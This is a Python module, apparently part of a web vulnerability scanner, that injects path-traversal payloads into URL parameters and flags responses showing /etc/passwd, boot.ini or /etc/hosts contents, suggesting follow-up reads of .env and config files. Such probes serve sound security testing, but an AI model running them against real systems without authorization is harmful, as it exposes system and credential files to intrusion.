"""
Phase 2 - Module 8d: Local File Inclusion (LFI) Detection Engine
Detects path traversal and local file inclusion vulnerabilities.
"""
import asyncio
import httpx
from typing import List, Dict, Optional
from urllib.parse import urlencode, urlparse, parse_qs
from app.core.payload_manager import load_payloads
from app.core.verbose import v_info, v_finding

# Load LFI payloads
_LFI_PAYLOADS = load_payloads("lfi")

# Common file patterns to look for in response
LFI_INDICATORS = [
    (r"root:x:0:0", "found /etc/passwd contents"),
    (r"\[boot loader\]", "found boot.ini (Windows)"),
    (r"CMB_", "found Windows boot config"),
    (r"127.0.0.1\s+localhost", "found /etc/hosts content"),
    (r"daemon:x:", "found /etc/passwd contents"),
    (r"bin:x:", "found /etc/passwd contents"),
]

class LFIEngine:
    def __init__(self, timeout: int = 15):
        self.timeout = timeout
        self.payloads = _LFI_PAYLOADS if _LFI_PAYLOADS else [
            "../../../../../../../../etc/passwd",
            "/etc/passwd",
            "../etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "C:\\windows\\win.ini",
        ]

    async def test_traversal(self, url: str, param: str) -> List[Dict]:
        """Inject traversal payloads and check for sensitive file content indicators."""
        findings = []
        parsed = urlparse(url)
        base_params = parse_qs(parsed.query)
        
        async with httpx.AsyncClient(verify=False, timeout=self.timeout) as client:
            for payload in self.payloads[:30]: # Limit payloads per param
                test_params = {k: v[0] for k, v in base_params.items()}
                test_params[param] = payload
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
                
                try:
                    resp = await client.get(test_url, headers={"User-Agent": "Mozilla/5.0"})
                    body = resp.text
                    
                    for pattern, desc in LFI_INDICATORS:
                        import re
                        if re.search(pattern, body):
                            finding = {
                                "type": "Local File Inclusion (LFI)",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "severity": "high",
                                "confidence": 0.95,
                                "evidence": f"Indicator matched: {desc}",
                                "owasp_category": "A03:2021-Injection",
                                "suggested_next_step": "Try reading sensitive config files (e.g., .env, config.php, settings.py)",
                                "source": "king-internal",
                            }
                            v_finding("LFI", "high", test_url, f"param={param}")
                            findings.append(finding)
                            return findings # Confirm one then move on
                except Exception:
                    pass
        return findings

    async def scan(self, assets: List[Dict]) -> List[Dict]:
        """Scan assets for Local File Inclusion."""
        all_findings = []
        tasks = []
        
        for asset in assets:
            url = asset.get("url", "")
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())
            
            if params:
                for param in params:
                    tasks.append(self.test_traversal(url, param))
        
        if not tasks:
            return []
            
        results = await asyncio.gather(*tasks)
        for r in results:
            all_findings.extend(r)
            
        return all_findings
